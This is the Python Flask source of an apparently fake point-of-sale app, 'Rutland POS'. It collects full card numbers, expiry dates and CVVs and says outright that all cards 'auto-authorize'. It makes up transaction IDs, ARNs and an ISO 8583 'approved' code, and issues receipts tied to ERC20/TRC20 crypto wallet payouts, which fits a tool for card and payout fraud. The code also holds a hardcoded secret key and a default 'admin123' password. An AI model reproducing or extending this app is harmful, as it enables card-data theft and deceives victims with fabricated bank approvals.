# app.py - cleaned Rutland POS (all cards auto-authorize)
from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash, jsonify
import random, logging, qrcode, io, os, json, hashlib, re
from datetime import datetime
from functools import wraps
from decimal import Decimal, InvalidOperation

app = Flask(__name__)
app.secret_key = 'rutland_secret_key_8583'
logging.basicConfig(level=logging.INFO)

# Configuration
USERNAME = "rutlandadmin"
PASSWORD_FILE = "password.json"

# Ensure password file exists
if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256("admin123".encode()).hexdigest()
        json.dump({"password": hashed}, f)

def check_password(raw):
    with open(PASSWORD_FILE) as f:
        stored = json.load(f)['password']
    return hashlib.sha256(raw.encode()).hexdigest() == stored

def set_password(newpass):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256(newpass.encode()).hexdigest()
        json.dump({"password": hashed}, f)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            flash("You must be logged in.")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

# Protocols (determine expected auth code length)
PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        passwd = request.form.get('password')
        if user == USERNAME and check_password(passwd):
            session['logged_in'] = True
            return redirect(url_for('protocol'))
        flash("Invalid username or password.")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash("You have been logged out.")
    return redirect(url_for('login'))

@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    if request.method == 'POST':
        current = request.form['current']
        new = request.form['new']
        if not check_password(current):
            return render_template('change_password.html', error="Current password incorrect.")
        set_password(new)
        return render_template('change_password.html', success="Password changed.")
    return render_template('change_password.html')

@app.route('/protocol', methods=['GET', 'POST'])
@login_required
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            flash("Invalid protocol selected.")
            return redirect(url_for('protocol'))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]

        # Flag pinless
        session['pinless'] = ("101.8" in selected)

        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
@login_required
def amount():
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
@login_required
def payout():
    if request.method == 'POST':
        method = request.form['method']
        session['payout_type'] = method

        if method == 'ERC20':
            wallet = request.form.get('erc20_wallet', '').strip()
            if not wallet.startswith("0x") or len(wallet) != 42:
                flash("Invalid ERC20 address format.")
                return redirect(url_for('payout'))
            session['wallet'] = wallet

        elif method == 'TRC20':
            wallet = request.form.get('trc20_wallet', '').strip()
            if not wallet.startswith("T") or len(wallet) < 34:
                flash("Invalid TRC20 address format.")
                return redirect(url_for('payout'))
            session['wallet'] = wallet

        return redirect(url_for('card'))

    return render_template('payout.html')


# Server-side validator for card entry
from datetime import datetime

# Top-of-file config (put near other global constants)
BLACKLIST_PREFIXES = ['1','2','7','8','9','6']  # adjust if you want to allow '6' etc.

def luhn_check(card_number: str) -> bool:
    """Return True if card_number passes Luhn algorithm."""
    try:
        digits = [int(d) for d in card_number]
    except ValueError:
        return False
    checksum = 0
    dbl = False
    for d in reversed(digits):
        if dbl:
            val = d * 2
            if val > 9:
                val -= 9
            checksum += val
        else:
            checksum += d
        dbl = not dbl
    return checksum % 10 == 0

@app.route('/card', methods=['GET', 'POST'])
@login_required
def card():
    if request.method == 'POST':
        # sanitize inputs (client formatting may include spaces/slashes)
        pan_raw = request.form.get('pan', '')
        pan_digits = re.sub(r'\D', '', pan_raw)  # remove spaces and non-digits
        expiry_raw = request.form.get('expiry', '')
        expiry_clean = re.sub(r'\D', '', expiry_raw)  # MMYY expected after cleaning
        cvv_raw = request.form.get('cvv', '')
        cvv_digits = re.sub(r'\D', '', cvv_raw)

        # Basic presence checks
        if not pan_digits:
            flash("Card number is required.")
            return render_template('card.html')
        if not expiry_clean:
            flash("Expiry date is required.")
            return render_template('card.html')
        if not cvv_digits:
            flash("CVV is required.")
            return render_template('card.html')

        # PAN length check (must be exactly 16 digits for your flow)
        if len(pan_digits) != 16:
            flash("Card must be 16 digits.")
            return render_template('card.html')

        # BIN prefix blacklist (first digit)
        first_digit = pan_digits[0]
        if first_digit in BLACKLIST_PREFIXES:
            flash("Invalid / unsupported card BIN.")
            return render_template('card.html')

        # Luhn check
        if not luhn_check(pan_digits):
            flash("Card number failed validation (invalid number).")
            return render_template('card.html')

        # Expiry: expect MMYY (2 + 2)
        if len(expiry_clean) != 4:
            flash("Expiry must be in MM/YY format.")
            return render_template('card.html')
        try:
            month = int(expiry_clean[:2])
            year_two = int(expiry_clean[2:])
        except ValueError:
            flash("Expiry must contain a valid month and year.")
            return render_template('card.html')
        if month < 1 or month > 12:
            flash("Expiry month must be between 01 and 12.")
            return render_template('card.html')

        # Convert two-digit year to full year (assume 2000-2099)
        year_full = 2000 + year_two
        now = datetime.utcnow()
        # If expiry is at end of expiry month, it's still valid for that month
        expiry_dt = datetime(year=year_full, month=month, day=1)
        # Compare (year,month) to current (year,month)
        if (year_full < now.year) or (year_full == now.year and month < now.month):
            flash("Card has expired.")
            return render_template('card.html')

        # Card type inference for CVV length
        if pan_digits.startswith("4"):
            card_type = "VISA"
            expected_cvv_len = 3
        elif pan_digits.startswith("5"):
            card_type = "MASTERCARD"
            expected_cvv_len = 3
        elif pan_digits.startswith("3"):
            card_type = "AMEX"
            expected_cvv_len = 4
        elif pan_digits.startswith("6"):
            card_type = "DISCOVER"
            expected_cvv_len = 3
        else:
            card_type = "UNKNOWN"
            expected_cvv_len = 3

        if len(cvv_digits) != expected_cvv_len:
            flash(f"CVV must be {expected_cvv_len} digits for {card_type}.")
            return render_template('card.html')

        # All server-side validations passed -> store values and continue
        # NOTE: Avoid logging sensitive values (do not log CVV).
        session.update({
            'pan': pan_digits,
            'exp': expiry_clean,
            'cvv': cvv_digits,          # stored in session for auth flow; remove if you prefer not to store
            'card_type': card_type
        })

        # If pinless, jump straight to decrypting screen
        if session.get("pinless"):
            return redirect(url_for('decrypting'))

        return redirect(url_for('auth'))

    # GET handler
    return render_template('card.html')


@app.route('/decrypting')
@login_required
def decrypting():
    # This page shows the animation, then JS redirects to /success (pinless auto-approve)
    # If you prefer to go to rejected for pinless flows, change the redirect in the template
    # For consistency with "authorize all cards", we'll proceed to success from decrypting client-side JS.
    return render_template('decrypting.html')

@app.route('/auth', methods=['GET', 'POST'])
@login_required
def auth():
    expected_length = session.get('code_length', 6)

    if request.method == 'POST':
        code = request.form.get('auth', '').strip()

        # Validate length only. Approve any card/code that matches expected length.
        if len(code) != expected_length:
            return render_template('auth.html',
                                   warning=f"Code must be {expected_length} digits.",
                                   expected_length=expected_length)

        # Always approve
        txn_id = f"TXN{random.randint(100000, 999999)}"
        arn = f"ARN{random.randint(100000000000, 999999999999)}"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        field39 = "00"

        session.update({
            "txn_id": txn_id,
            "arn": arn,
            "timestamp": timestamp,
            "field39": field39,
            "auth_code": code  # store entered code for receipt masking
        })
        return redirect(url_for('success'))

    return render_template('auth.html', expected_length=expected_length)

@app.route('/success')
@login_required
def success():
    return render_template('success.html',
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan", "")[-4:],
        amount=session.get("amount"),
        timestamp=session.get("timestamp")
    )

@app.route("/receipt")
def receipt():
    raw_protocol = session.get("protocol", "")
    match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
    if match:
        protocol_version = match.group(1)
        auth_digits = int(match.group(2))
    else:
        protocol_version = "Unknown"
        auth_digits = 4

    raw_amount = session.get("amount", "0")
    try:
        # try parse as Decimal for nicer formatting
        amt = Decimal(str(raw_amount))
        amount_fmt = f"{amt:,.2f}"
    except (InvalidOperation, TypeError):
        amount_fmt = "0.00"

    # Determine how to mask the auth code:
    stored_auth = session.get("auth_code", "")
    if stored_auth:
        auth_mask = "*" * len(stored_auth)
    else:
        auth_mask = "*" * auth_digits

    return render_template("receipt.html",
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan")[-4:] if session.get("pan") else "",
        amount=amount_fmt,
        payout=session.get("payout_type"),
        wallet=session.get("wallet"),
        auth_code=auth_mask,
        iso_field_18="5999",                # Default MCC
        iso_field_25="00",                  # POS condition
        field39="00",                       # ISO8583 Field 39 (approved)
        card_type=session.get("card_type", "VISA"),
        protocol_version=protocol_version,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    )

@app.route('/rejected')
def rejected():
    # Kept for compatibility but rarely used now that all cards auto-approve.
    return render_template('rejected.html',
        code=request.args.get("code", "XX"),
        reason=request.args.get("reason", "Transaction Declined")
    )

@app.route("/licence")
def licence():
    return render_template("licence.html")

@app.route('/offline')
@login_required
def offline():
    return render_template('offline.html')

if __name__ == '__main__':
    app.run(debug=True)

